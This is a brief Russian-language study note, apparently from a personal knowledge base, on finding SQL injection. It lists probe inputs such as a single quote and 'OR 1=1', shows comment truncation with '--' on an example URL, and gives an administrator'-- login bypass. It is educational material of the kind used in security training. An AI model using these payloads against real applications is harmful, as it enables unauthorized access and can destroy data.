---

---

[[0Определение SQL Injection]] - карта раздела

---

первое что нужно проверить `'` и посмотреть на ошибки или странности

---
Булевые проверки такие как
`'OR 1=1` `OR 1=2` (Применять очень аккуратно потому что если приложение содержит `UPDATE` или `DELETE` можем потерять все данные )
и просмотр ответов приложения

---
Полезные нагрузки влияющие на длительность ответа

---
Чаще всего возникают в `Update`, `Insert`, `Where`, `Select` и где используются имя столбца, `SELECT` без `ORDER BY`

---
`--` являются комметариями и помогают формировать запрос
`https://insecure-website.com/products?category=Gifts--`
запрос будет выглядеть вот так
```sql
SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1
```
 ---
 пример если аутентификация пользователя происходит через форму логина и пароля
```
SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese'
```
и вот как можно исправить sql запрос 
```
SELECT * FROM users WHERE username = 'administrator'--' AND password = ''
```
то есть в поле вписать `administrator'--` 